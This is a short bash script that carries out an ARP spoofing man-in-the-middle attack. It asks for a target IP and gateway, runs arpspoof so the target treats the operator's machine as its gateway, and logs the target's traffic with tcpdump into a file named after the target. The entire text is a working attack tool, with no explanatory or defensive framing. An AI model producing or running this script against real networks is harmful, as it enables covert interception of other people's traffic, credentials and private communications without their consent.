#!/bin/bash

printf "Please specify the target IP address... \n"
read target 

printf "Please specify the Gateway IP for this network...\n"
read gateway

sleep 1

printf "ARP Spoofing in-progress. $target should now believe you are $gateway \n"
printf "All network traffic from the target machine will be logged in the log file 'tcpdump-$target.txt' \n"

sleep 5

arpspoof -t $target $gateway &

tcpdump -v | grep "$target" > tcpdump-$target.txt
